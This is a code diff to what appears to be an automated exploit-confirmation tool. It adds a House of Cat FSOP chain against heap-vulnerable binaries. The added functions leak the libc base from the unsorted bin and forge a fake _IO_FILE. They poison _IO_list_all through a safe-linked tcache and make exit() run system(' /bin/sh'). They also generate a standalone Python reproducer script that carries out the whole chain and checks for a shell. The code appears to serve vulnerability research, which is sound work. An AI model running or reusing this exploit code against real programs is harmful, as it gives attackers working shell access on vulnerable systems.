@@ -198,6 +198,22 @@ def chain_primitive_stage(ctx) -> dict:
                     shutil.rmtree(wd, ignore_errors=True)
                 if got:
                     return got
+        # No win function, but a heap bug can still reach a SHELL without one: House of Cat forges a
+        # FILE and makes exit() run system(" /bin/sh"). Needs the linked libc + a disclosing view;
+        # self-skips otherwise. The no-win branch that used to stop at an L2 recipe.
+        if vclass in ("uaf", "double_free", "heap_overflow") and not pie:
+            from .exploit_stage import _libc_bytes_for
+            staged = _stage_and_crawl(ctx, target, exe_dir=None)
+            if staged:
+                wd, exe_p, opts_p, model_p, width_p = staged
+                try:
+                    got = _house_of_cat_shell(ctx, target, target_bytes, lead, vclass, exe=exe_p,
+                                              opts=opts_p, model=model_p, width=width_p, workdir=wd,
+                                              libc_data=_libc_bytes_for(ctx, target) or b"")
+                finally:
+                    shutil.rmtree(wd, ignore_errors=True)
+                if got:
+                    return got
         recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
         why = "no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
         _file_recipe(ctx, target, lead, vclass, win, recipe, why)
@@ -756,6 +772,164 @@ def _fastbin_dup_chain(ctx, exe, target_bytes, win, opts, model, width, workdir,
                                       f"fake chunk at {tgt:#x} (size {used:#x}) := &{win_name} -> ran"))
                     return roles, trig, tgt, used, key
     return None
+
+
+# --------------------------------------------------------------- House of Cat (no-win FSOP -> shell)
+# Big-chunk request for the unsorted-bin leak + the FILE blob (> tcache max, so it frees straight to
+# the unsorted bin), and the small-chunk request for the single safe-linking tcache poison.
+_HOC_BIG, _HOC_GUARD, _HOC_SMALL = 0x4F8, 0x18, 0x18
+
+
+def _hoc_leak_and_blob_offsets():
+    """The user-pointer distance from the leaked unsorted bk to the reclaimed chunk that will hold
+    the FILE blob: the reclaimed chunk is the FIRST-freed big chunk (unsorted hands out its bk), and
+    the leaked bk is the SECOND, one big chunk + one guard higher, so subtract both chunk sizes and
+    add the 0x10 chunk->mem for the user pointer."""
+    from .heap import request2size
+    return request2size(_HOC_BIG) + request2size(_HOC_GUARD) - 0x10
+
+
+def _hoc_run(spawn, width, roles, model, markers, uoff, cat, exit_seqs, *, corrupt):
+    """One in-process House-of-Cat run on a NO-WIN heap target -> shell, ASLR-robust (leak + forge +
+    poison + trigger in one process):
+
+      1. unsorted leak -- free two big (> tcache-max) chunks and view the first: its fd is
+         `main_arena+0x60` (libc base = fd - unsorted_bin_offset) and its bk is the other big chunk
+         (a live heap address);
+      2. the FILE  -- reclaim the first big chunk and write a `heap.build_house_of_cat` fake FILE
+         into it (one bulk edit, no poison);
+      3. the write -- ONE safe-linked tcache poison lands a chunk over `_IO_list_all` and points it
+         at the fake FILE;
+      4. the trigger -- an exit sequence returns from main, exit() walks `_IO_list_all`, and the
+         fake FILE's vtable runs `system(" /bin/sh")`; the spawned shell then evaluates the
+         forgery-proof marker command.
+
+    `corrupt` points `_IO_list_all` at a WRONG address for the negative control (no shell). Returns
+    (libc_base, shell_output). Never raises."""
+    from ..fuzz import menu
+    from . import heap as _heap, heap_groom
+    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
+    proc = spawn()
+    try:
+        _pie_drain(proc)
+
+        def send(b):
+            proc.stdin.write(b)
+            proc.stdin.flush()
+
+        def alloc(req):
+            send(menu._scalar(add.encode(), width)
+                 + menu._fill(model_of(add), num=str(req).encode(), width=width))
+            _pie_drain(proc)
+
+        def free_i(i):
+            send(menu._scalar(free.encode(), width) + menu._scalar(str(i).encode(), width))
+            _pie_drain(proc)
+
+        def view_i(i):
+            send(menu._scalar(view.encode(), width) + menu._scalar(str(i).encode(), width))
+            return _pie_drain(proc)[0]
+
+        def edit_i(i, payload):
+            out = menu._scalar(edit.encode(), width) + menu._scalar(str(i).encode(), width)
+            if "num" in model_of(edit):
+                out += menu._scalar(str(len(payload)).encode(), width)
+            send(out + menu._data(payload, width, term=False))
+            _pie_drain(proc)
+
+        model_of = lambda o: model.get(o, [])
+
+        # (1) unsorted leak: big1, guard, big2, guard -> free big1, big2 -> view big1
+        alloc(_HOC_BIG); alloc(_HOC_GUARD); alloc(_HOC_BIG); alloc(_HOC_GUARD)   # 0,1,2,3
+        free_i(0); free_i(2)
+        leak = view_i(0)
+        if len(leak) < 16:
+            return None, b""
+        fd = int.from_bytes(leak[:8], "little")
+        bk = int.from_bytes(leak[8:16], "little")
+        base = fd - uoff
+        if base <= 0 or base & 0xFFF:                     # a real libc base is page aligned
+            return None, b""
+        blob_addr = bk - _hoc_leak_and_blob_offsets()
+        # (2) reclaim big1 (unsorted hands out its bk == big1) and write the fake FILE into it
+        blob = _heap.build_house_of_cat(blob_addr, wfile_jumps=base + cat["wfile_jumps"],
+                                        plan="system", system=base + cat["system"],
+                                        command=b" /bin/sh")
+        alloc(_HOC_BIG)                                   # idx 4 == big1, now holds the blob
+        edit_i(4, blob)
+        # (3) one safe-linked tcache poison: a chunk over _IO_list_all, written with &blob
+        list_all = base + cat["list_all"]
+        alloc(_HOC_SMALL); alloc(_HOC_SMALL)              # 5, 6
+        free_i(5); free_i(6)                              # tcache [6, 5]
+        key = heap_groom.parse_heap_key(view_i(5))
+        if key is None:
+            return base, b""
+        edit_i(6, _p64(key ^ (list_all & ~0xF)))          # poison head fd -> _IO_list_all (aligned)
+        alloc(_HOC_SMALL); alloc(_HOC_SMALL)              # 7 == head, 8 == chunk at _IO_list_all
+        target_val = blob_addr ^ (0xDEAD0000 if corrupt else 0)
+        edit_i(8, _p64(target_val))                       # _IO_list_all := &blob (or wrong, for neg)
+        # (4) trigger exit, then feed the spawned shell the forgery-proof marker command
+        out = b""
+        for seq in (tuple(exit_seqs) or (b"q\n",)):
+            send(seq)
+            out += _pie_drain(proc, total=0.6)[0]
+            send(markers.command + b"\n")
+            out += _pie_drain(proc, total=1.2)[0]
+            if markers.proves(out) or proc.poll() is not None:
+                break
+        return base, (out if isinstance(out, bytes) else out.encode("latin1"))
+    except (BrokenPipeError, OSError):
+        return None, b""
+    finally:
+        from ..dynamic import sandbox as _sb
+        _sb.kill_quietly(proc)
+
+
+def _house_of_cat_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, width,
+                        workdir, libc_data):
+    """NO-WIN heap target -> shell via House of Cat (FSOP). The branch a heap bug fell into when the
+    binary had no win function and no reachable code pointer: the tcache poison could land a chunk
+    anywhere, but with nothing to point at it stopped at an L2 recipe. House of Cat needs no win --
+    it forges a FILE and makes exit() run `system(" /bin/sh")`.
+
+    Needs the linked libc (House-of-Cat offsets + the measured unsorted-bin offset), a view that
+    discloses a heap pointer (the unsorted-bin leak), a UAF/edit to plant the poison fd, and an exit
+    route. Marker-confirmed (a shell must EVALUATE the forgery-proof marker) with a negative control
+    (a wrong `_IO_list_all` must not spawn one). Returns the filer's result dict or None."""
+    from ..dynamic import heap_discover
+    from . import attribution
+    from . import heap as _heap
+    if not libc_data:
+        return None
+    cat = _heap.house_of_cat_targets(libc_data, "system")
+    if not cat or not cat.get("system"):
+        return None
+    try:
+        libc_path = Path(workdir) / "libc_for_offset.so"
+        libc_path.write_bytes(libc_data)
+        uoff = _heap.unsorted_bin_offset(str(libc_path))
+    except Exception:                                    # noqa: BLE001
+        uoff = None
+    if not uoff:
+        return None
+    roles = heap_discover.identify_heap_ops(workdir, exe, model, opts, width)
+    if not roles or not roles.get("edit"):
+        return None
+    markers = attribution.make_code_markers()
+    exit_seqs = _exit_sequences(opts, model, width)
+    spawn = _pie_spawn(workdir, exe)
+    base, pos = _hoc_run(spawn, width, roles, model, markers, uoff, cat, exit_seqs, corrupt=False)
+    if not (base and markers.proves(pos)):
+        ctx.emit("chain.hoc", payload={"ok": False, "libc_base": base,
+                 "note": "House of Cat did not spawn a shell (no leak / plan mismatch)"})
+        return None
+    _, neg = _hoc_run(spawn, width, roles, model, markers, uoff, cat, exit_seqs, corrupt=True)
+    if markers.proves(neg):                              # a wrong _IO_list_all also "won" -> unsound
+        ctx.emit("chain.hoc", payload={"ok": False, "note": "negative control also spawned a shell"})
+        return None
+    ctx.progress(msg=(f"House of Cat: unsorted leak -> libc {base:#x}, fake FILE in a heap chunk, "
+                      f"_IO_list_all poisoned -> exit ran system(\" /bin/sh\") -> shell"))
+    return _file_house_of_cat_l3(ctx, target, lead, vclass, roles, base, uoff, cat, exit_seqs)
 
 
 def _oob_write_seq(writer, fields, idx, value, trig, model, width) -> bytes:
@@ -1673,6 +1847,129 @@ def _file_fastbin_dup_l3(ctx, target, lead, vclass, win_name, win_addr, roles, t
     ctx.progress(pct=100, msg=f"L3 CONFIRMED (heap): fastbin dup -> {win_name}")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": vclass, "fastbin_dup": True}}
+
+
+def _house_of_cat_repro_script(roles, uoff, cat, exit_seqs, blob_gap) -> bytes:
+    """A stdlib-only reproducer for the no-win House-of-Cat shell. Bakes the libc-version-specific
+    offsets (so no libc is needed at run time), recovers the base from the unsorted-bin leak, builds
+    the fake FILE for the "system" plan inline (House-of-Cat field offsets), poisons `_IO_list_all`
+    and triggers. Rebuilds the blob without importing lykos (`heap.cat_offsets` documents the
+    layout)."""
+    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
+    exitseq = (exit_seqs or [b"q\n"])[0].decode("latin1")
+    editnum = "num" in (roles.get("edit_fields") or [])
+    return (
+        "#!/usr/bin/env python3\n"
+        "# House-of-Cat no-win FSOP shell reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
+        "import subprocess, select, os, struct, sys, time\n"
+        f"UOFF={uoff:#x}; LIST_ALL={cat['list_all']:#x}; WFJ={cat['wfile_jumps']:#x}; "
+        f"SYS={cat['system']:#x}\n"
+        f"BIG={_HOC_BIG}; GUARD={_HOC_GUARD}; SMALL={_HOC_SMALL}; BLOB_GAP={blob_gap:#x}; "
+        f"EDITNUM={bool(editnum)}\n"
+        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
+        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "def drain(t=0.3):\n"
+        "  b=b''; end=time.time()+t\n"
+        "  while time.time()<end:\n"
+        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
+        "    if r:\n"
+        "      c=os.read(p.stdout.fileno(),4096)\n"
+        "      if not c: break\n"
+        "      b+=c\n"
+        "    elif p.poll() is not None: break\n"
+        "  return b\n"
+        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
+        f"def alloc(sz): send({add!r}+'\\n'); send(str(sz)+'\\n'); drain()\n"
+        f"def free(i): send({free!r}+'\\n'); send(str(i)+'\\n'); drain()\n"
+        f"def view(i): send({view!r}+'\\n'); send(str(i)+'\\n'); return drain()\n"
+        "def edit(i,payload):\n"
+        f"  send({edit!r}+'\\n'); send(str(i)+'\\n')\n"
+        "  if EDITNUM: send(str(len(payload))+'\\n')\n"
+        "  send(payload); drain()\n"
+        "def cat_blob(file_addr):\n"                       # the "system"-plan fake FILE, built inline
+        "  b=bytearray(0x390)\n"
+        "  def w(o,v): b[o:o+8]=struct.pack('<Q',v & 0xFFFFFFFFFFFFFFFF)\n"
+        "  b[0:8]=(b' /bin/sh'+b'\\x00'*8)[:8]\n"           # _flags doubles as the command
+        "  w(0x88, file_addr+0x380); w(0x300+0x68, BASE+SYS); w(0x68, 0)\n"
+        "  w(0xa0, file_addr+0x180); w(0xc0, 1); w(0xd8, BASE+WFJ)\n"
+        "  w(0x180+0x18, 0); w(0x180+0x20, 1); w(0x180+0x30, 0); w(0x180+0xe0, file_addr+0x300)\n"
+        "  return bytes(b)\n"
+        "drain()\n"
+        "alloc(BIG); alloc(GUARD); alloc(BIG); alloc(GUARD)\n"   # big1,g,big2,g
+        "free(0); free(2)\n"
+        "lk=view(0)\n"
+        "assert len(lk)>=16, 'view disclosed <16 bytes'\n"
+        "fd=int.from_bytes(lk[:8],'little'); bk=int.from_bytes(lk[8:16],'little')\n"
+        "BASE=fd-UOFF\n"
+        "assert BASE>0 and BASE%0x1000==0, 'no page-aligned libc base from the unsorted leak'\n"
+        "blob_addr=bk-BLOB_GAP\n"
+        "alloc(BIG)\n"                                     # reclaim big1
+        "edit(4, cat_blob(blob_addr))\n"
+        "alloc(SMALL); alloc(SMALL); free(5); free(6)\n"
+        "kk=view(5)\n"
+        "key=next((int.from_bytes(kk[i:i+8],'little') for i in range(0,max(1,len(kk)-7)) "
+        "if 0x100<=int.from_bytes(kk[i:i+8],'little')<(1<<36)), None)\n"
+        "assert key is not None, 'no heap key for the poison'\n"
+        "edit(6, struct.pack('<Q', key ^ ((BASE+LIST_ALL)&~0xf)))\n"
+        "alloc(SMALL); alloc(SMALL)\n"
+        "edit(8, struct.pack('<Q', blob_addr))\n"          # _IO_list_all := &blob
+        f"send({exitseq!r}); time.sleep(0.2)\n"            # exit -> _IO_flush_all -> system(' /bin/sh')
+        "send('echo CAT_SHELL_$((1+1))\\n')\n"             # a shell evaluates the arithmetic
+        "out=drain(1.0)\n"
+        "sys.stdout.write(out.decode('latin-1','ignore'))\n"
+        "print('\\n[+] shell confirmed' if b'CAT_SHELL_2' in out else '[-] no shell')\n"
+    ).encode()
+
+
+def _file_house_of_cat_l3(ctx, target, lead, vclass, roles, base, uoff, cat, exit_seqs):
+    """File a confirmed no-win House-of-Cat shell as an L3 verified PoC (bundle = target + a runnable
+    FSOP reproducer that recovers the base and spawns a shell)."""
+    import json as _json
+
+    from ...db.dao import FindingDAO, PocDAO
+    from . import bundle
+    from .heap import request2size
+    blob_gap = request2size(_HOC_BIG) + request2size(_HOC_GUARD) - 0x10
+    script = _house_of_cat_repro_script(roles, uoff, cat, exit_seqs, blob_gap)
+    input_sha = ctx.put_artifact("house-of-cat-repro", data=script)
+    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
+            "exploit": f"{vclass}->shell (House of Cat FSOP, no win function)", "target": "shell",
+            "libc_base": hex(base), "leak_option": roles["view"], "tool_version": TOOL_VERSION}
+    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
+                        "stdin", [], None,
+                        primitive={"type": vclass, "target": "shell", "confirmed": True,
+                                   "note": "House of Cat FSOP, no win function"})
+    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
+    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
+                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
+    eff = (f"working heap exploit ({vclass} -> SHELL with NO win function, via House of Cat / FSOP): "
+           f"option {roles['view']}'s view of a freed large chunk disclosed the libc base (unsorted "
+           f"bin fd) and a heap address, a fake _IO_FILE was written into a heap chunk, ONE "
+           f"safe-linked tcache poison pointed _IO_list_all at it, and returning from main made "
+           f"exit() flush it -> system(\" /bin/sh\"). Shown in ONE process (a real ASLR defeat -- "
+           f"libc base {base:#x} recovered live) and confirmed by a shell EVALUATING a forgery-proof "
+           f"marker command under a passing negative control (a corrupted _IO_list_all spawns none).")
+    fd = FindingDAO(ctx.conn)
+    cand = {"cwe": lead.cwe,
+            "title": "Shell (demonstrated): L3 House of Cat FSOP (no win function)",
+            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
+            "confidence": 0.99, "authoritative": True, "title_only": True,
+            "dedup_key": f"chain:{vclass}:house-of-cat:{target.id}", "site_detail": "shell",
+            "evidence": [{"channel": "effects", "detail": _json.dumps([{
+                "kind": "rce", "title": "Spawned shell (House of Cat FSOP, no win, ASLR defeated)",
+                "status": "demonstrated", "detail": eff,
+                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
+                          "note": eff}}])}]}
+    fd.upsert(target.id, target.case_id, cand)
+    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
+    if fid:
+        PocDAO(ctx.conn).set_finding(poc_id, fid)
+    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
+    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
+             "technique": "house-of-cat", "libc_base": hex(base), "bundle": bundle_sha})
+    ctx.progress(pct=100, msg="L3 CONFIRMED (heap): House of Cat FSOP -> shell (no win)")
+    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
+            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "house_of_cat": True}}
 
 
 def _stage_and_crawl(ctx, target, *, exe_dir=None):
